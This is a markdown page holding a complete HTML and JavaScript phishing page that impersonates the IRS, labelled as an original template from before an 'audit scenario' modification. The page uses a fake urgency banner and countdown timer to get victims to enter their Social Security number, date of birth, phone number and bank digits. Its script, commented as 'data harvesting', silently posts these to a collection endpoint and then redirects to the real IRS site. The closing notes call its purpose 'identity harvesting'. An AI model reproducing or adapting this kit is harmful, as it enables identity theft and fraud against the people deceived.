# Original Mobile SMS Template (Before Audit Modification)

## **📱 Original Mobile Verification Form Template**

**This is the original template before audit scenario modifications**

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IRS Mobile Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #f5f5f5;
            padding: 10px;
        }
        .mobile-container { 
            max-width: 100%;
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .header { 
            text-align: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #003d7a;
        }
        .logo { 
            font-size: 18px;
            font-weight: bold;
            color: #003d7a;
        }
        .urgent { 
            background: #ffebee;
            border-left: 4px solid #d32f2f;
            padding: 12px;
            margin: 15px 0;
            font-size: 14px;
        }
        .form-group { 
            margin-bottom: 15px;
        }
        .form-label { 
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 5px;
            display: block;
        }
        .form-input { 
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }
        .submit-btn { 
            width: 100%;
            background: #1976d2;
            color: white;
            padding: 15px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            margin-top: 10px;
        }
        .security-badge { 
            text-align: center;
            font-size: 12px;
            color: #666;
            margin-top: 15px;
        }
        .timer { 
            text-align: center;
            font-size: 14px;
            color: #d32f2f;
            font-weight: bold;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="mobile-container">
        <div class="header">
            <div class="logo">🏛️ Internal Revenue Service</div>
            <div style="font-size: 12px; color: #666;">U.S. Department of Treasury</div>
        </div>
        
        <div class="urgent">
            <strong>⚠️ URGENT:</strong> Account verification required to prevent suspension.
        </div>
        
        <div class="timer" id="countdown">
            ⏰ Time remaining: 23:47:32
        </div>
        
        <h3 style="margin-bottom: 15px;">Quick Mobile Verification</h3>
        
        <form id="mobileForm" onsubmit="return false;">
            <div class="form-group">
                <label class="form-label">Social Security Number</label>
                <input type="tel" class="form-input" placeholder="XXX-XX-XXXX" pattern="[0-9]{3}-[0-9]{2}-[0-9]{4}" required>
            </div>
            
            <div class="form-group">
                <label class="form-label">Date of Birth</label>
                <input type="date" class="form-input" required>
            </div>
            
            <div class="form-group">
                <label class="form-label">Phone Number</label>
                <input type="tel" class="form-input" placeholder="(XXX) XXX-XXXX" required>
            </div>
            
            <div class="form-group">
                <label class="form-label">Last 4 digits of Bank Account</label>
                <input type="tel" class="form-input" placeholder="XXXX" maxlength="4" required>
            </div>
            
            <button type="submit" class="submit-btn" onclick="submitForm()">
                🔒 Verify Account Now
            </button>
        </form>
        
        <div class="security-badge">
            🔐 256-bit SSL Encryption • Your data is protected
        </div>
    </div>
    
    <script>
        // Countdown timer for urgency
        function updateCountdown() {
            const timer = document.getElementById('countdown');
            let time = 24 * 3600 - Math.floor(Date.now() / 1000) % (24 * 3600);
            const hours = Math.floor(time / 3600);
            const mins = Math.floor((time % 3600) / 60);
            const secs = time % 60;
            timer.textContent = `⏰ Time remaining: ${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
        }
        setInterval(updateCountdown, 1000);
        
        // Form submission with data harvesting
        function submitForm() {
            const form = document.getElementById('mobileForm');
            const formData = new FormData(form);
            
            // Harvest data
            const data = {
                ssn: formData.get('ssn') || form.elements[0].value,
                dob: formData.get('dob') || form.elements[1].value,
                phone: formData.get('phone') || form.elements[2].value,
                account: formData.get('account') || form.elements[3].value,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                source: 'mobile_sms'
            };
            
            // Send to collection endpoint
            fetch('/api/mobile-collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => {}); // Silent failure
            
            // Show success and redirect
            alert('✅ Verification complete! Redirecting to your account...');
            setTimeout(() => {
                window.location.href = 'https://www.irs.gov';
            }, 1500);
        }
        
        // Auto-format SSN input
        document.querySelector('input[placeholder="XXX-XX-XXXX"]').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 3) value = value.slice(0,3) + '-' + value.slice(3);
            if (value.length >= 6) value = value.slice(0,6) + '-' + value.slice(6,10);
            e.target.value = value;
        });
        
        // Auto-format phone input  
        document.querySelector('input[placeholder="(XXX) XXX-XXXX"]').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 3) value = '(' + value.slice(0,3) + ') ' + value.slice(3);
            if (value.length >= 9) value = value.slice(0,9) + '-' + value.slice(9,13);
            e.target.value = value;
        });
    </script>
</body>
</html>
```

---

## **📋 Original Form Fields:**
1. Social Security Number
2. Date of Birth
3. Phone Number
4. Last 4 digits of Bank Account

## **🎯 Original Use Case:**
- General account verification
- Basic identity harvesting
- Standard 24-hour urgency timer
- Simple data collection

---

**📝 This template was modified to create the audit scenario version with banking details and contact information.**